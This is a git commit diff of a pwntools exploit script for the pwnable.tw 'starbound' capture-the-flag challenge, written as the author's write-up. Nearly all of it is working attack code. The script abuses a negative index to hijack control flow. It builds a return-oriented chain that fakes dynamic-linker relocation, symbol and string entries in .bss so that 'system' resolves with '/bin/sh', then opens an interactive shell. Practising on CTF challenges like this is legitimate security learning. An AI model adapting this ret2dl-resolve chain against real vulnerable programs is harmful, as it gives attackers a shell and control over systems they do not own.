31082477ee55808c43584d1dcb1ce60f72e7d417
dkmos2016 <dkmos2016@126.com>
2021-02-24 15:32:03 +0800

    finish pwnable's starbound write_up

--- starbound_wp.py
+++ starbound_wp.py
@@ -1,8 +1,8 @@
 from pwn import *
 import pdb
 
-# p = remote('chall.pwnable.tw', 10200)
-p = process('/home/len/pwnable/starbound')
+# p = remote('chall.pwnable.tw', 10202)
+p = process('/home/len/pwnable/starbound.bak')
 
 
 def set_name(name):
@@ -16,38 +16,49 @@ def trigger(payload):
     p.sendlineafter('> ', payload)
 
 
-STRTAB_ADDR = 0x804628c
-SYMTAB_ADDR = 0x8047488
-REL_PLT_ADDR = 0x80487c8
-NAME_ADDR = 0x80580D0
+elf = ELF('/home/len/pwnable/starbound.bak')
 
-elf = ELF('/home/len/pwnable/starbound')
-puts_plt_addr = elf.symbols['puts']
-ret_dl_resolve = 0x804895B
+context.proxy = {
+    'http_proxy': 'http://192.168.152.1:19999',
+    'https_proxy': 'http://192.168.152.1:19999'
+}
 
-gadget = 0x8048e48
-read_plt_addr = 0x8055054
+bss_stage = 0x8057D90
+REL_PLT_ADDR = elf.get_section_by_name('.rel.plt').header.sh_addr  #
+SYMTAB_ADDR = elf.get_section_by_name('.dynsym').header.sh_addr  #
+STRTAB_ADDR = elf.get_section_by_name('.dynstr').header.sh_addr  #
 
-fake_rel_addr = NAME_ADDR + 0x8
+read_plt_addr = elf.plt['read']
+read_got_addr = elf.got['read']
+
+fake_str_addr = bss_stage
+fake_str = 'system\x00/bin/sh'.ljust(16, chr(0))
+binsh_addr = fake_str_addr + 7
+fake_str_offset = fake_str_addr - STRTAB_ADDR  # system
+
+fake_rel_addr = fake_str_addr + 0x10 + 0x8
 fake_rel_offset = fake_rel_addr - REL_PLT_ADDR
 
-fake_symbol_addr = fake_rel_addr + 0x8 + 0x8
+fake_symbol_addr = fake_rel_addr + 0x8 + 0xc
 fake_symbol_offset = fake_symbol_addr - SYMTAB_ADDR
 fake_symbol_index = fake_symbol_offset / 0x10
 
-fake_str_addr = fake_symbol_addr + 0x10
-fake_str_offset = fake_str_addr - STRTAB_ADDR  # system
-
 fake_rel_info = fake_symbol_index << 8 | 7
-fake_rel = p32(read_plt_addr) + p32(fake_rel_info)
+fake_rel = p32(read_got_addr) + p32(fake_rel_info)
 fake_symbol = p32(fake_str_offset) + p32(0) * 2 + p32(0X12)
-fake_str = 'system\x00'
 
 context.log_level = 'info'
 
+add_esp_gadget = 0x8048e48
+ppp_ret_addr = 0x080494da
+ret_dl_resolve = 0x804895B
+
 if __name__ == "__main__":
-    set_name(
-        p32(gadget) + p32(0) + fake_rel + p32(0) * 2 + fake_symbol + fake_str)
+    set_name(p32(add_esp_gadget))
+
+    log.info("REL_PLT_ADDR: {:#x}".format(REL_PLT_ADDR))
+    log.info("SYMTAB_ADDR: {:#x}".format(SYMTAB_ADDR))
+    log.info("STRTAB_ADDR: {:#x}".format(STRTAB_ADDR))
 
     log.info("fake_rel_addr: {:#x}".format(fake_rel_addr))
     log.info("fake_symbol_addr: {:#x}".format(fake_symbol_addr))
@@ -57,8 +68,18 @@ if __name__ == "__main__":
     log.info("fake_symbol_offset: {:#x}".format(fake_symbol_offset))
     log.info("fake_str_offset: {:#x}".format(fake_str_offset))
 
+    payload = str(-33) + '\x00' + 'a' * 4 + p32(read_plt_addr) + p32(
+        ppp_ret_addr) + p32(0) + p32(bss_stage) + p32(0x200)
+
+    payload += p32(ret_dl_resolve) + p32(fake_rel_offset) + p32(binsh_addr)*2
+
     pdb.set_trace()
-    payload = str(-33) + '\x00' + 'a' * 4 + p32(ret_dl_resolve) + p32(
-        fake_rel_offset)
     trigger(payload)
+
+    payload = fake_str + p32(0) * 2 + fake_rel + p32(
+        0) * 3 + fake_symbol + p32(0)
+
+    pdb.set_trace()
+    p.sendline(payload)
+
     p.interactive()
